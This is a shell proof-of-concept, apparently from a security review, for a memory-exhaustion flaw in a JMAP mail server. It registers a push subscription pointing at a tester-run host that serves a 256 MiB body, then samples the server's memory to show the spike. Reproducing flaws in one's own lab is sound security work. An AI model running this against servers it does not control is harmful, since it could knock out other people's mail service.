#!/bin/sh
# F2: push notification error response body is read without a size limit (services/src/state_manager/http.rs, response.text()).
# Setup (your own instance + your own HTTPS host; nothing third-party):
#   1. Run F2_push_target.py on a host that (a) has a public IP or any IP the server classes as global,
#      (b) resolves from the server by a name with a public suffix, (c) presents a certificate the server trusts:
#        python3 F2_push_target.py <bind_ip> 443 <fullchain.pem> <privkey.pem> 256
#      In a lab: docker network with a non-RFC1918 subnet, --add-host <name>:<host_ip> on the container,
#      a local CA copied to /usr/local/share/ca-certificates/ + update-ca-certificates + container restart.
#   2. Set SW_HOST (JMAP base URL), SW_USER (user:password), PUSH_URL (https://<name>/push), RSS_CMD (prints RSS kB of the server pid).
# Expected on a fixed build: RSS flat (body discarded or capped at 1 KiB). Observed on 1.1.1: +~420 MB peak for a 256 MiB body.
set -u
: "${SW_HOST:=http://127.0.0.1:8080}"; : "${SW_USER:=user1@lab.test:CHANGE_ME}"; : "${PUSH_URL:=https://push.lab-review.net/push}"
: "${RSS_CMD:=docker exec sw3 awk '/VmRSS/{print \$2}' /proc/1/status}"
OUT=${OUT:-rss_samples.txt}; : > "$OUT"
( for i in $(seq 1 120); do echo "$(date +%T) $(sh -c "$RSS_CMD") kB"; sleep 0.25; done > "$OUT" ) &
sleep 1
echo "baseline RSS: $(head -1 "$OUT")"
curl -s --noproxy '*' -u "$SW_USER" -X POST "$SW_HOST/jmap" -H 'content-type: application/json' \
  -d "{\"using\":[\"urn:ietf:params:jmap:core\"],\"methodCalls\":[[\"PushSubscription/set\",{\"create\":{\"p1\":{\"deviceClientId\":\"f2-$(date +%s)\",\"url\":\"$PUSH_URL\",\"types\":[\"Mailbox\"]}}},\"c0\"]]}"; echo
sleep 30; wait
echo "peak RSS:     $(sort -k2 -n "$OUT" | tail -1)"
echo "final RSS:    $(tail -1 "$OUT")"
echo "(push target log shows the verification POST and bytes sent; one subscription = one verification request)"
